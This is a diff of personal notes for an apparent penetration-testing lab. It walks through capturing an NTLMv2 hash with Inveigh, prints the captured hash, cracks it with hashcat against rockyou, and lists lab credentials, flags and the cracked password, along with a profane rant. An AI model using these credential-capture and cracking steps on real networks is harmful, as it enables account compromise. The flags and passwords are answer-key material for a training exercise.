@@ -197,24 +197,17 @@ Question 3 -  Escalate privileges on the MS01 host and submit the contents of th
 18) in file explorer go to C:\Users\Administrator\Desktop\ -> type in .\ilfserveradm:Sys26Admin and click on flag - 33a9d46de4015e7b3b0ad592a9394720  
 
 
-
-wget https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Inveigh.ps1
-
-copy from KALI file system... actually right click -> copy -> RDP'd desktop -> right click -> paste 
-
-open powershell as admin with creds or -> .\ilfserveradm:Sys26Admin
-
+Question 4 - Obtain the NTLMv2 password hash for the mpalledorous user and crack it to reveal the cleartext value. Submit the user's password as your answer.
+1) ON KALI: wget https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Inveigh.ps1
+2) copy from KALI file system... actually right click -> copy -> RDP'd desktop -> right click -> paste 
+3) open powershell as admin with creds or -> .\ilfserveradm:Sys26Admin
 cd C:\Users\ilfserveradm\Desktop\
 Import-Module .\Inveigh.ps1
 Invoke-Inveigh -ConsoleOutput Y -FileOutput Y
 
+4) and of course.. didnt work but we have the hash.. sometiems i fuckkkkkkkkkkkkkkkkkkking hate these rooms when you do everything right and shit still doesnt work...
 
-and of course.. didnt work but we have the hash.. sometiems i fuckkkkkkkkkkkkkkkkkkking hate these rooms when you do everything right and shit still doesnt work...
-
-MPALLEDOROUS::ACADEMY-AEN-DEV:477f4c13cb9a1d84:68a32591cf780a08b97ddf88b74562f2:01010000000000000bfcbcdc50d3d80129d4a3832c8060f20000000002001a0049004e004c0041004e004500460052004500490047004800540001001e00410043004100440045004d0059002d00410045004e002d004d00530030000400260049004e004c0041004e00450046005200450049004700480054002e004c004f00430041004c0003004800410043004100440045004d0059002d00410045004e002d004d005300300031002e0049004e004c0041004e00450046005200450049004700480054002e004c004f00430041004c000500260049004e004c0041004e00450046005200450049004700480054002e004c004f00430041004c00070008000bfcbcdc50d3d80106000400020000000800300030000000000000000000000000200000f639834f7a1ff15762aa38b165a715249d7c9429b72ac5ea2f93a6ae00285f920a001000000000000000000000000000000000000900200063006900660073002f003100370032002e00310036002e0038002e0035003000000000000000000000000000
-
-copy to doc on KALI machine then run 
-
-hashcat -m 5600 dumb.txt /usr/share/wordlists/rockyou.txt and get output of: 
-
-1squints2
+4.a) MPALLEDOROUS::ACADEMY-AEN-DEV:477f4c13cb9a1d84:68a32591cf780a08b97ddf88b74562f2:01010000000000000bfcbcdc50d3d80129d4a3832c8060f20000000002001a0049004e004c0041004e004500460052004500490047004800540001001e00410043004100440045004d0059002d00410045004e002d004d00530030000400260049004e004c0041004e00450046005200450049004700480054002e004c004f00430041004c0003004800410043004100440045004d0059002d00410045004e002d004d005300300031002e0049004e004c0041004e00450046005200450049004700480054002e004c004f00430041004c000500260049004e004c0041004e00450046005200450049004700480054002e004c004f00430041004c00070008000bfcbcdc50d3d80106000400020000000800300030000000000000000000000000200000f639834f7a1ff15762aa38b165a715249d7c9429b72ac5ea2f93a6ae00285f920a001000000000000000000000000000000000000900200063006900660073002f003100370032002e00310036002e0038002e0035003000000000000000000000000000
+5) copy to doc on KALI machine then run 
+6) hashcat -m 5600 dumb.txt /usr/share/wordlists/rockyou.txt and get output of: 
+7) output: 1squints2
